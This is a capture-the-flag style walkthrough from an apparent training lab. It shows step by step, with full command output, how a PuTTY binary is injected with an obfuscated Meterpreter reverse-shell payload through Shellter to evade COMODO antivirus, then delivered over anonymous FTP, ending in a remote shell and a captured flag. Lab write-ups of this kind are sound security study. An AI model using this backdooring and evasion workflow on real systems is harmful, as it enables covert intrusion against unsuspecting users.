# Walk: Antivirus Evasion - Module Exercise - VM #1 

## Objetivo
Capstone Lab: In this exercise, you'll be facing off against COMODO antivirus engine running on Module Exercise VM #1. 
Use another popular 32-bit application, like PuTTY, to replicate the steps learned so far in order to inject malicious code in the binary with Shellter. 
The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, 
the victim user will double-click on any existing .exe file(s) in the FTP root directory. 
If the antivirus flags the script as malicious, the script will be quarantined and then deleted. 
Otherwise, the script will execute and hopefully, grant you a reverse shell. 
NOTE: set the FTP session as active and enable binary encoding while transferring the file.

## Procedimiento y comandos

#### Paso 1: Enumeracion
```bash
┌──(root㉿kali)-[/home/…/15-AntiVirus/03-AV-EvasionPractice/Capstones/VM-1]
└─# nmap -sC -sV 192.168.189.53 -Pn -oN nmap.txt  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 09:11 -03
Nmap scan report for 192.168.189.53
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: 403 - Forbidden: Access is denied.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.83 seconds
```
#### Paso 2: Descargamos el binario putty.exe y generamos el archvimo malicioso con shellter

```bash
┌──(kali㉿kali)-[~]
└─$ shellter



        1010101 01   10 0100110 10     01  11001001 0011101 001001
        11      10   01 00      01     01     01    10      11   10
        0010011 1110001 11011   11     10     00    10011   011001
             11 00   10 01      11     01     11    01      01   11
        0010010 11   00 0011010 100111 000111 00    1100011 01   10 v7.2
        www.ShellterProject.com                     Wine Mode



Choose Operation Mode - Auto/Manual (A/M/H): A

PE Target: /home/kali/putty.exe

**********
* Backup *
**********

Backup: Shellter_Backups\putty.exe




********************************
* PE Compatibility Information *
********************************

Minimum Supported Windows OS: 5.1

Note: It refers to the minimum required Windows version for the target
      application to run. This information is taken directly from the
      PE header and might be not always accurate.




******************
* Packed PE Info *                                                                                       
******************                                                                                       
                                                                                                         
Status: Possibly Not Packed - The EntryPoint is located in the first section!




***********************
* PE Info Elimination *                                                                                  
***********************                                                                                  
                                                                                                         
Data: Dll Characteristics (Dynamic ImageBase etc...), Digital Signature.

Status: All related information has been eliminated!




****************
* Tracing Mode *                                                                                         
****************                                                                                         
                                                                                                         
Status: Tracing has started! Press CTRL+C to interrupt tracing at any time.

Note: In Auto Mode, Shellter will trace a random number of instructions
      for a maximum time of approximately 30 seconds in native Windows
      hosts and for 60 seconds when used in Wine.



DisASM.dll was created successfully!



Instructions Traced: 20650

Tracing Time Approx: 1.02 mins.



Starting First Stage Filtering...



*************************
* First Stage Filtering *                                                                                
*************************                                                                                
                                                                                                         
Filtering Time Approx: 0.0034 mins.



Enable Stealth Mode? (Y/N/H): Y
                                                                                                         
************                                                                                             
* Payloads *                                                                                             
************                                                                                             
                                                                                                         
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec

Use a listed payload or custom? (L/C/H): L
                                                                                                         
Select payload by index: 1                                                                               
                                                                                                         
***************************                                                                              
* meterpreter_reverse_tcp *                                                                              
***************************                                                                              
                                                                                                         
SET LHOST: 192.168.45.213                                                                                
                                                                                                         
SET LPORT: 4444                                                                                          
                                                                                                         
                                                                                                         
                                                                                                         
****************                                                                                         
* Payload Info *                                                                                         
****************                                                                                         
                                                                                                         
Payload: meterpreter_reverse_tcp                                                                         

Size: 281 bytes

Reflective Loader: NO

Encoded-Payload Handling: Enabled

Handler Type: IAT



******************
* Encoding Stage *                                                                                       
******************                                                                                       
                                                                                                         
Encoding Payload: Done!                                                                                  


****************************
* Assembling Decoder Stage *                                                                             
****************************                                                                             
                                                                                                         
Assembling Decoder: Done!                                                                                


***********************************
* Binding Decoder & Payload Stage *                                                                      
***********************************                                                                      
                                                                                                         
Status: Obfuscating the Decoder using Thread Context Aware Polymorphic
        code, and binding it with the payload.

Please wait...

Binding: Done!


*********************
* IAT Handler Stage *                                                                                    
*********************                                                                                    
                                                                                                         
                                                                                                         
Fetching IAT Pointers to Memory Manipulation APIs...


0. VirtualAlloc --> N/A
1. VirtualAllocEx --> N/A
2. VirtualProtect --> N/A
3. VirtualProtectEx --> N/A
4. HeapCreate/HeapAlloc --> N/A
5. LoadLibrary/GetProcAddress --> IAT[503b60]/IAT[503ad8]
6. GetModuleHandle/GetProcAddress --> IAT[503acc]/IAT[503ad8]
7. CreateFileMapping/MapViewOfFile --> IAT[503a04]/IAT[503b80]

Using Method --> 5



***************************
* IAT Handler Obfuscation *                                                                              
***************************                                                                              
                                                                                                         
Status: Binding the IAT Handler with Thread Context Aware Polymorphic code.

Please wait...

Code Generation Time Approx: 0.062 seconds.



*************************
* PolyMorphic Junk Code *                                                                                
*************************                                                                                
                                                                                                         
Type: Engine                                                                                             

Generating: ~312 bytes of PolyMorphic Junk Code

Please wait...

Generated: 312 bytes

Code Generation Time Approx: 0.056 seconds.



Starting Second Stage Filtering...



**************************
* Second Stage Filtering *                                                                               
**************************                                                                               
                                                                                                         
Filtering Time Approx: 0.00277 mins.



*******************
* Injection Stage *                                                                                      
*******************                                                                                      
                                                                                                         
Virtual Address: 0x4b79ed                                                                                

File Offset: 0xb6ded

Section: .text

Adjusting stub pointers to IAT...

Done!

Adjusting Call Instructions Relative Pointers...

Done!

Injection Completed!

*******************
* PE Checksum Fix *                                                                                      
*******************                                                                                      
                                                                                                         
Status: Valid PE Checksum has been set!

Original Checksum: 0x17a04c

Computed Checksum: 0x173097

**********************
* Verification Stage *                                                                                   
**********************                                                                                   
                                                                                                                                                                                                                  
Info: Shellter will verify that the first instruction of the
      injected code will be reached successfully.
      If polymorphic code has been added, then the first
      instruction refers to that and not to the effective
      payload.
      Max waiting time: 10 seconds.

 Warning!
 If the PE target spawns a child process of itself before
 reaching the injection point, then the injected code will
 be executed in that process. In that case Shellter won't
 have any control over it during this test.
 You know what you are doing, right? ;o)

Injection: Verified!


Press [Enter] to continue...
```

#### Paso 3: Subimos el archivo por ftp:

```bash
┌──(root㉿kali)-[/home/kali]
└─# ftp 192.168.189.53
Connected to 192.168.189.53.
220 Microsoft FTP Service
Name (192.168.189.53:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> put putty.exe
local: putty.exe remote: putty.exe
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |*********************************************************|  1461 KiB  432.30 KiB/s    00:00 ETA
226 Transfer complete.
1496576 bytes sent in 00:03 (407.75 KiB/s)
ftp> 
```

#### Paso 4: Obtenemos el flag:

```bash
msf6 exploit(multi/handler) > options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.45.213   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Sending stage (177734 bytes) to 192.168.189.53
[*] Meterpreter session 1 opened (192.168.45.213:4444 -> 192.168.189.53:51623) at 2025-06-23 15:35:46 -0300

meterpreter > shell
Process 7232 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>cd C:\
cd C:\

C:\> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
'Get-ChildItem' is not recognized as an internal or external command,
operable program or batch file.

C:\>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/23/2025   2:32 PM             78 flag.txt                                                             

PS C:\> cd Users\Administrator\Desktop
cd Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> type flag.txt
type flag.txt
OS{cbab90d27e621b11809d287ee7615ca3}
PS C:\Users\Administrator\Desktop> 
```

